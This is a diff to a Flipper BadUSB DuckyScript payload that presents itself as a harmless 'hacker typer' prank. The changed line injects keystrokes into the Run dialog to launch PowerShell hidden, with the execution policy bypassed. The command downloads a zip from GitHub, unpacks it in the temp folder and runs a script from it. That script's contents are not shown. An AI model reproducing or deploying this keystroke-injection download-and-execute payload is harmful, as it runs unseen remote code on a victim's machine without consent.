@@ -1,5 +1,5 @@
 REM UPDATE (08/30/2024):NOW INCLUDING - Wait for mouse option!
-REM  08/19/2024 - Published
+REM  08/19/2024
 REM  Hacker-typer By UberGuidoZ Git BadUSB resources -> https://github.com/UberGuidoZ/Flipper/tree/main/BadUSB
 REM  Opens a harmless website and types like a hacker
 
@@ -34,7 +34,7 @@ DELAY 1000
 GUI r
 DELAY 500
 REM                            
-STRING "powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";iwr 'https://github.com/luciferseamus/HackerTyper/raw/main/t.zip' -O "$D\t.zip";Expand-Archive "$D\t.zip" -Des $D\t -Force;cd $D\t;.\'ts5.ps1';";
+STRING powershell -w h -NoP -NonI -Exec Bypass $D="$env:tmp";iwr 'https://github.com/luciferseamus/HackerTyper/raw/refs/heads/main/t.zip' -O "$D\t.zip";Expand-Archive "$D\t.zip" -Des $D\t -Force;cd $D\t;.\'t1.ps1';
 ENTER
 
 REM Delay is currently set for 5 seconds
